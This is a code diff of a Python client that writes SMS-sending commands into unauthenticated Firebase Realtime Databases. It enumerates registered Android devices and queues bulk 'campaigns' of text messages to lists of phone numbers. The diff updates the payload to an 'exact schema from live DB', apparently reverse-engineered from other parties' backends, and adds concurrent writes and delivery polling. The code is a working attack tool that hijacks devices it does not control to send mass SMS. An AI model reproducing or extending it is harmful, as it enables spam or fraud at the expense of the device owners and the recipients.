@@ -1,9 +1,9 @@
 """
-Firebase Realtime Database REST client (no auth — rules: true).
+Firebase RTDB REST client.
+Path: sendSms/{deviceId}/{timestamp} — exact schema from live DB.
 """
 
 import asyncio
-import uuid
 import time
 import aiohttp
 from dataclasses import dataclass
@@ -67,8 +67,6 @@ def _load_urls() -> list[str]:
 
 RTDB_URLS: list[str] = _load_urls()
 
-DEVICE_PATHS     = ["devices", "Devices", "device", "Device", "users", "Users"]
-SMS_QUEUE_PATH   = "sms_tasks"
 MAX_SMS_PER_DB   = 60
 CONCURRENT_WRITE = 40
 POLL_INTERVAL    = 8
@@ -80,8 +78,6 @@ class RtdbDevice:
     db_url: str
     device_id: str
     label: str = ""
-    phone_number: str = ""
-    status: str = "online"
 
 
 @dataclass
@@ -90,10 +86,9 @@ class CampaignStats:
     sent: int = 0
     failed: int = 0
     pending: int = 0
-    db_url: str = ""
 
 
-async def _get(session: aiohttp.ClientSession, url: str) -> Optional[dict]:
+async def _get(session: aiohttp.ClientSession, url: str) -> Optional[dict | bool]:
     try:
         async with session.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
             if r.status == 200:
@@ -111,41 +106,25 @@ async def _put(session: aiohttp.ClientSession, url: str, data: dict) -> bool:
         return False
 
 
-async def _discover_devices_one(session: aiohttp.ClientSession, db_url: str) -> list[RtdbDevice]:
-    top = await _get(session, f"{db_url}/.json?shallow=true")
-    if not top or not isinstance(top, dict):
+async def _get_devices_one(session: aiohttp.ClientSession, db_url: str) -> list[RtdbDevice]:
+    """Get device IDs from registeredDevices (shallow — just need the keys)."""
+    data = await _get(session, f"{db_url}/registeredDevices.json?shallow=true")
+    if not data or not isinstance(data, dict):
         return []
-    for path in DEVICE_PATHS:
-        if path.lower() not in [k.lower() for k in top.keys()]:
-            continue
-        data = await _get(session, f"{db_url}/{path}.json?shallow=true")
-        if not data or not isinstance(data, dict):
-            continue
-        devices = []
-        for dev_id in data:
-            record = await _get(session, f"{db_url}/{path}/{dev_id}.json")
-            if not record or not isinstance(record, dict):
-                continue
-            status = str(record.get("status", record.get("Status", "online"))).lower()
-            if status in ("offline", "inactive", "disconnected"):
-                continue
-            devices.append(RtdbDevice(
-                db_url=db_url,
-                device_id=dev_id,
-                label=str(record.get("name", record.get("deviceName", record.get("model", dev_id))))[:30],
-                phone_number=str(record.get("phoneNumber", record.get("phone_number", ""))),
-                status=status,
-            ))
-        if devices:
-            return devices
-    return [RtdbDevice(db_url=db_url, device_id="default",
-                       label=db_url.split("//")[1].split(".")[0])]
+    devices = []
+    for dev_id in data.keys():
+        devices.append(RtdbDevice(
+            db_url=db_url,
+            device_id=dev_id,
+            label=dev_id[:12],
+        ))
+    return devices
 
 
 async def discover_all_devices() -> list[RtdbDevice]:
     async with aiohttp.ClientSession() as session:
         results = await asyncio.gather(
-            *[_discover_devices_one(session, url) for url in RTDB_URLS],
+            *[_get_devices_one(session, url) for url in RTDB_URLS],
             return_exceptions=True,
         )
     devices = []
@@ -155,83 +134,133 @@ async def discover_all_devices() -> list[RtdbDevice]:
     return devices
 
 
-async def _write_sms_task(session, db_url, task_id, phone, text, campaign_id) -> bool:
+def _make_sms_payload(device_id: str, phone: str, text: str) -> tuple[str, dict]:
+    """Build the exact payload the Android app expects."""
+    ts = int(time.time() * 1000)
+    # Unique key per message: timestamp + small offset avoids collision
+    key = str(ts)
     payload = {
-        "to":         phone,
-        "message":    text,
-        "campaignId": campaign_id,
-        "status":     "pending",
-        "createdAt":  int(time.time() * 1000),
+        "action": {
+            "command": "sendSms",
+            "id": ts,
+            "messageText": text,
+            "phoneNumber": phone,
+            "sendSms": {
+                "from": 1,
+                "message": text,
+                "simSlot": "1",
+                "to": phone,
+            },
+            "simSlot": "1",
+            "targetDeviceId": device_id,
+            "timestamp": ts,
+        },
+        "id": ts,
+        "timestamp": ts,
     }
-    return await _put(session, f"{db_url}/{SMS_QUEUE_PATH}/{task_id}.json", payload)
+    return key, payload
 
 
-async def dispatch_campaign(devices, numbers, text, progress_cb=None) -> tuple[str, dict]:
-    campaign_id = str(uuid.uuid4())[:12]
-    db_urls     = list({d.db_url for d in devices})
-    db_counts   = {u: 0 for u in db_urls}
-    assignments = []
+async def dispatch_campaign(
+    devices: list[RtdbDevice],
+    numbers: list[str],
+    text: str,
+    progress_cb=None,
+) -> tuple[str, list[tuple[str, str, str]]]:
+    """
+    Write SMS tasks to sendSms/{deviceId}/{timestamp}.
+    Returns (campaign_tag, [(db_url, device_id, task_key), ...])
+    """
+    import uuid
+    campaign_tag = str(uuid.uuid4())[:8]
+
+    # Build assignments: round-robin across devices, max MAX_SMS_PER_DB per device
+    dev_counts: dict[str, int] = {}   # (db_url, device_id) -> count
+    assignments: list[tuple[RtdbDevice, str]] = []  # (device, phone)
 
     for i, phone in enumerate(numbers):
-        for attempt in range(len(db_urls)):
-            url = db_urls[(i + attempt) % len(db_urls)]
-            if db_counts[url] < MAX_SMS_PER_DB:
-                assignments.append((url, f"{campaign_id}_{str(uuid.uuid4())[:8]}", phone))
-                db_counts[url] += 1
+        placed = False
+        for attempt in range(len(devices)):
+            dev = devices[(i + attempt) % len(devices)]
+            key = (dev.db_url, dev.device_id)
+            if dev_counts.get(key, 0) < MAX_SMS_PER_DB:
+                assignments.append((dev, phone))
+                dev_counts[key] = dev_counts.get(key, 0) + 1
+                placed = True
                 break
+        if not placed:
+            break  # all devices capped
 
-    total       = len(assignments)
-    db_task_map = {u: [] for u in db_urls}
-    sent = failed = 0
-    sem  = asyncio.Semaphore(CONCURRENT_WRITE)
+    total   = len(assignments)
+    written = 0
+    failed  = 0
+    task_log: list[tuple[str, str, str]] = []  # (db_url, device_id, task_key)
+    sem = asyncio.Semaphore(CONCURRENT_WRITE)
 
-    async def _write_one(db_url, task_id, phone):
-        nonlocal sent, failed
+    async def _write_one(dev: RtdbDevice, phone: str):
+        nonlocal written, failed
+        task_key, payload = _make_sms_payload(dev.device_id, phone, text)
+        url = f"{dev.db_url}/sendSms/{dev.device_id}/{task_key}.json"
         async with sem:
             async with aiohttp.ClientSession() as s:
-                ok = await _write_sms_task(s, db_url, task_id, phone, text, campaign_id)
+                ok = await _put(s, url, payload)
         if ok:
-            sent += 1
-            db_task_map[db_url].append(task_id)
+            written += 1
+            task_log.append((dev.db_url, dev.device_id, task_key))
         else:
             failed += 1
-        if progress_cb and ((sent + failed) % 50 == 0 or (sent + failed) == total):
-            await progress_cb(sent, total, failed)
+        if progress_cb and ((written + failed) % 50 == 0 or (written + failed) == total):
+            await progress_cb(written, total, failed)
+        await asyncio.sleep(0.02)  # tiny gap avoids duplicate timestamp keys
 
-    await asyncio.gather(*[_write_one(u, t, p) for u, t, p in assignments])
-    return campaign_id, db_task_map
+    await asyncio.gather(*[_write_one(d, p) for d, p in assignments])
+    return campaign_tag, task_log
 
 
-async def poll_stats(db_task_map, campaign_id, update_cb=None):
+async def poll_stats(
+    task_log: list[tuple[str, str, str]],
+    campaign_tag: str,
+    update_cb=None,
+):
+    """
+    Poll sendSms/{deviceId}/{taskKey} for status changes.
+    Looks for isSended:true / status field to mark as sent.
+    """
     deadline = time.time() + POLL_TIMEOUT
-    total    = sum(len(v) for v in db_task_map.values())
+    total    = len(task_log)
+    done_keys: set[str] = set()
 
     while time.time() < deadline:
         await asyncio.sleep(POLL_INTERVAL)
+
         grand = CampaignStats(total=total)
-        stats_list = []
         async with aiohttp.ClientSession() as session:
-            for db_url, task_ids in db_task_map.items():
-                if not task_ids:
+            for db_url, device_id, task_key in task_log:
+                if task_key in done_keys:
+                    grand.sent += 1
                     continue
-                s = CampaignStats(total=len(task_ids), db_url=db_url)
-                for tid in task_ids:
-                    rec = await _get(session, f"{db_url}/{SMS_QUEUE_PATH}/{tid}.json")
-                    if not rec:
-                        s.pending += 1
-                        continue
-                    st = str(rec.get("status", "pending")).lower()
-                    if st in ("sent", "delivered", "success"):
-                        s.sent += 1
-                    elif st in ("failed", "error"):
-                        s.failed += 1
-                    else:
-                        s.pending += 1
-                stats_list.append(s)
-                grand.sent    += s.sent
-                grand.failed  += s.failed
-                grand.pending += s.pending
+                rec = await _get(session, f"{db_url}/sendSms/{device_id}/{task_key}.json")
+                if not rec or not isinstance(rec, dict):
+                    grand.pending += 1
+                    continue
+                action = rec.get("action", {})
+                is_sent = (
+                    rec.get("isSended") is True
+                    or action.get("isSended") is True
+                    or str(rec.get("status", "")).lower() in ("sent", "delivered", "success")
+                )
+                is_failed = str(rec.get("status", "")).lower() in ("failed", "error")
+
+                if is_sent:
+                    grand.sent += 1
+                    done_keys.add(task_key)
+                elif is_failed:
+                    grand.failed += 1
+                    done_keys.add(task_key)
+                else:
+                    grand.pending += 1
+
         if update_cb:
-            await update_cb(grand, stats_list)
+            await update_cb(grand, [])
         if grand.pending == 0:
             break
